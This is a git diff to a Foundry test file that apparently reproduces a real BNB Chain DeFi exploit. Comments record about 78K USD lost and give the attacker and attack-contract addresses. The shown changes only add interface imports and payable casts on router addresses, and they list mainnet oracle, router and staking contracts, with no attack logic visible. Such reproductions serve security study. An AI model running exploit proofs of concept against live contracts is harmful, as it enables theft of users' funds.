@@ -3,6 +3,12 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV2Factory} from "src/interfaces/IUniswapV2Factory.sol";
+import {IDPPOracle} from "src/interfaces/IDPPOracle.sol";
 // @KeyInfo - Total Lost : ~78K USD$
 // Attacker : https://bscscan.com/address/0x7ccf451d3c48c8bb747f42f29a0cde4209ff863e
 // Attack Contract : https://bscscan.com/address/0xa7fe9c5d4b87b0d03e9bb99f4b4e76785de26b5d
@@ -39,9 +45,11 @@ contract ContractTest is Test {
     IDPPOracle private constant DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
     IDPPOracle private constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
     IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
-    IUniswapV2Router private constant Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    IUniswapV2Router private constant PancakeRouter1 = IUniswapV2Router(0xfDE81E1f340C3ec271142723781df9e685653213);
-    IUniswapV2Router private constant PancakeRouter2 = IUniswapV2Router(0x5D82aeA1fE75CB40AfE792dAe1cf76EA8E2808CE);
+    IUniswapV2Router private constant Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IUniswapV2Router private constant PancakeRouter1 =
+        IUniswapV2Router(payable(0xfDE81E1f340C3ec271142723781df9e685653213));
+    IUniswapV2Router private constant PancakeRouter2 =
+        IUniswapV2Router(payable(0x5D82aeA1fE75CB40AfE792dAe1cf76EA8E2808CE));
     IStakingRewards private constant StakingRewards1 = IStakingRewards(0x26Eea9ff2f3caDec4d6Fc4f462F677b58AB31Ab0);
     IStakingRewards private constant StakingRewards2 = IStakingRewards(0x3A006dD44a4a0e43C942f57d452a6a7Ada25AdC3);
     IUniswapV2Pair private constant BUSDT_Split = IUniswapV2Pair(0xe4D038DE672e226877Db8FA2670C5ba9778155fF);
